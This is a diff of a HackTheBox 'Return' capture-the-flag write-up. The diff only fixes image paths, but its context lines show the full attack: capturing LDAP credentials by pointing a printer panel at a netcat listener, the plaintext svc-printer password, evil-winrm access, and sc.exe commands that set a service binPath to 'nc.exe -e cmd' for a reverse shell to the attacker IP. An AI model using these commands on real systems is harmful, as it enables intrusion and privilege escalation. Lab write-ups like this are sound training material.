@@ -50,7 +50,7 @@ We start with an ICMP ping to check if the host is reachable and to get an initi
 ping -c 1 10.10.11.108
 ```
 
-![ping.png](GitHubv2/HackTheBox/EASY/Return/screenshots/ping.png)
+![ping.png](screenshots/ping.png)
 
 The host responds, confirming it is online and reachable through our VPN connection.
 
@@ -73,7 +73,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.108 -oG allPorts
 - `-Pn` → Treat host as alive (skip host discovery).  
 - `-oG allPorts` → Output in grepable format for later parsing.
 
-![allports.png](GitHubv2/HackTheBox/EASY/Return/screenshots/allports.png)
+![allports.png](screenshots/allports.png)
 
 Once the scan is finished, we extract the list of open ports into a comma-separated format for targeted scanning:
 
@@ -81,7 +81,7 @@ Once the scan is finished, we extract the list of open ports into a comma-separa
 extractPorts allPorts
 ```
 
-![extractports.png](GitHubv2/HackTheBox/EASY/Return/screenshots/extractports.png)
+![extractports.png](screenshots/extractports.png)
 
 ---
 
@@ -104,7 +104,7 @@ Let's review the result:
 cat targeted -l java
 ```
 
-![targeted.png](GitHubv2/HackTheBox/EASY/Return/screenshots/targeted.png)
+![targeted.png](screenshots/targeted.png)
 
 **Findings:**
 
@@ -140,7 +140,7 @@ We start with SMB enumeration to see if anonymous access is allowed:
 crackmapexec smb 10.10.11.108
 ```
 
-![crackmapexec.png](GitHubv2/HackTheBox/EASY/Return/screenshots/crackmapexec.png)
+![crackmapexec.png](screenshots/crackmapexec.png)
 
 Then, we try listing available shares without credentials:
 
@@ -149,7 +149,7 @@ smbclient -L 10.10.11.108 -N
 smbmap -H 10.10.11.108 -u none
 ```
 
-![smbclient_null.png](GitHubv2/HackTheBox/EASY/Return/screenshots/smbclient_null.png)
+![smbclient_null.png](screenshots/smbclient_null.png)
 
 **Result:** SMB requires authentication; null sessions are not allowed.
 
@@ -159,11 +159,11 @@ smbmap -H 10.10.11.108 -u none
 
 Accessing `http://10.10.11.108` reveals a **network printer administration panel**:
 
-![web.png](GitHubv2/HackTheBox/EASY/Return/screenshots/web.png)
+![web.png](screenshots/web.png)
 
 Navigating to **Settings** shows configuration fields for server addresses:
 
-![web_settings.png](GitHubv2/HackTheBox/EASY/Return/screenshots/web_settings.png)
+![web_settings.png](screenshots/web_settings.png)
 
 > **Note:** Enterprise multifunction printers (Canon, Xerox, Epson, etc.) often store **LDAP** and **SMB** credentials for Active Directory queries and network file storage.
 
@@ -185,11 +185,11 @@ nc -nlvp 389
 
 Next, we change the printer's **Server address** to our attacker machine IP:
 
-![web_settings_changed.png](GitHubv2/HackTheBox/EASY/Return/screenshots/web_settings_changed.png)
+![web_settings_changed.png](screenshots/web_settings_changed.png)
 
 Clicking **Upload** triggers the printer to connect to our listener, sending stored credentials in the process:
 
-![nc_with_printer.png](GitHubv2/HackTheBox/EASY/Return/screenshots/nc_with_printer.png)
+![nc_with_printer.png](screenshots/nc_with_printer.png)
 
 **Credentials obtained:**
 - **User:** `svc-printer`
@@ -205,7 +205,7 @@ We verify the credentials over SMB:
 crackmapexec smb 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
 ```
 
-![crackmapexeec_smb_svc_printer.png](GitHubv2/HackTheBox/EASY/Return/screenshots/crackmapexeec_smb_svc_printer.png)
+![crackmapexeec_smb_svc_printer.png](screenshots/crackmapexeec_smb_svc_printer.png)
 
 The account exists.
 
@@ -215,7 +215,7 @@ We check for WinRM access:
 crackmapexec winrm 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
 ```
 
-![crackmapexeec_winrm_svc_printer.png](GitHubv2/HackTheBox/EASY/Return/screenshots/crackmapexeec_winrm_svc_printer.png)
+![crackmapexeec_winrm_svc_printer.png](screenshots/crackmapexeec_winrm_svc_printer.png)
 
 ---
 
@@ -227,7 +227,7 @@ With valid credentials and WinRM open, we gain a shell:
 evil-winrm -i 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
 ```
 
-![user_flag.png](GitHubv2/HackTheBox/EASY/Return/screenshots/user_flag.png)
+![user_flag.png](screenshots/user_flag.png)
 
 🏁 **User flag obtained**
 
@@ -244,7 +244,7 @@ whoami /priv
 net user svc-printer
 ```
 
-![svc_printer_priv.png](GitHubv2/HackTheBox/EASY/Return/screenshots/svc_printer_priv.png)
+![svc_printer_priv.png](screenshots/svc_printer_priv.png)
 
 The account belongs to the **Server Operators** group.
 
@@ -257,7 +257,7 @@ List current services:
 services
 ```
 
-![svc_printer_services.png](GitHubv2/HackTheBox/EASY/Return/screenshots/svc_printer_services.png)
+![svc_printer_services.png](screenshots/svc_printer_services.png)
 
 ---
 
@@ -265,7 +265,7 @@ services
 
 We upload `nc.exe` to the target:
 
-![nc_uploaded.png](GitHubv2/HackTheBox/EASY/Return/screenshots/nc_uploaded.png)
+![nc_uploaded.png](screenshots/nc_uploaded.png)
 
 ---
 
@@ -279,13 +279,13 @@ sc.exe create reverse binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd 10.10.
 
 If creation fails, modify an existing one (e.g., `VMTools`):
 
-![create_process.png](GitHubv2/HackTheBox/EASY/Return/screenshots/create_process.png)
+![create_process.png](screenshots/create_process.png)
 
 ```bash
 sc.exe config VMTools binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd 10.10.14.7 443"
 ```
 
-![identify_process_to_change.png](GitHubv2/HackTheBox/EASY/Return/screenshots/identify_process_to_change.png)
+![identify_process_to_change.png](screenshots/identify_process_to_change.png)
 
 ---
 
@@ -305,7 +305,7 @@ sc.exe start VMTools
 ```
 
 🏁 **Root flag obtained**  
-![root_flag.png](GitHubv2/HackTheBox/EASY/Return/screenshots/root_flag.png)
+![root_flag.png](screenshots/root_flag.png)
 
 ---
 
